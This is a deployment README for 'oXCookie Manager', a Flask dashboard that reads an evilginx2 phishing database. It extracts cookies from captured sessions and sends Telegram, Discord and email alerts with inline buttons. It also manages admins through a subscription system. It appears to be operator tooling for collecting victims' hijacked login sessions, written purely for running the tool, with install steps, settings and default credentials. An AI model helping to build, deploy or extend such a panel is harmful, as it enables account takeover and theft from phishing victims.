# Deployment V2 - oXCookie Manager

This folder contains all files needed for deploying the oXCookie Manager application.

## Files Included

### Core Application Files
- `app.py` - Main Flask application
- `notifications.py` - Telegram, Discord, and Email notification handlers
- `database_reader.py` - Database reading utilities for session data
- `session_processor.py` - Session processing and cookie extraction
- `requirements.txt` - Python dependencies

### Templates
- `templates/` - HTML templates for the web interface
  - `index.html` - Main dashboard
  - `login.html` - Login page
  - `manage_admins.html` - Admin management interface
  - `notifications.html` - Notification settings
  - `database_viewer.html` - Database viewer

### Documentation
- `README.md` - General readme
- `DEFAULT_SETTINGS.md` - Default configuration settings
- `DEPLOYMENT.md` - Deployment instructions

### Scripts
- `start.sh` - Startup script for Linux/Unix systems

## Deployment Steps

1. **Install Python Dependencies**
   ```bash
   pip install -r requirements.txt
   ```

2. **Run the Application**
   ```bash
   python app.py
   ```
   Or use the startup script:
   ```bash
   bash start.sh
   ```

3. **Access the Application**
   - Default URL: http://localhost:5004
   - Default login: admin / admin123
   - **IMPORTANT**: Change the default password immediately!

## Configuration

The application will create a config directory at `~/.evilginx_monitor/` on first run.

### Required Settings
- Database path (`dbfile_path`) - Path to your evilginx2 database file
- Telegram settings (optional but recommended):
  - `telegram_enable` - Enable/disable Telegram notifications
  - `telegram_token` - Your Telegram bot token
  - `telegr_chatid` - Your Telegram chat ID

### Web URL
- Set `web_url` in settings to your production HTTPS URL for inline buttons in Telegram notifications
- Must be HTTPS and publicly accessible (not localhost)

## Features

- ✅ Session monitoring and notifications
- ✅ Telegram notifications with inline buttons
- ✅ IP whitelist management for admin users
- ✅ 3-strike lockout system for unauthorized IP access
- ✅ Admin management with subscription system
- ✅ Database viewer for session inspection
- ✅ Notification template customization

## Notes

- The application runs on port 5004 by default
- Config files are stored in `~/.evilginx_monitor/`
- Database path should point to your evilginx2 `data.db` file
- For production, use a production WSGI server (Gunicorn, uWSGI, etc.)

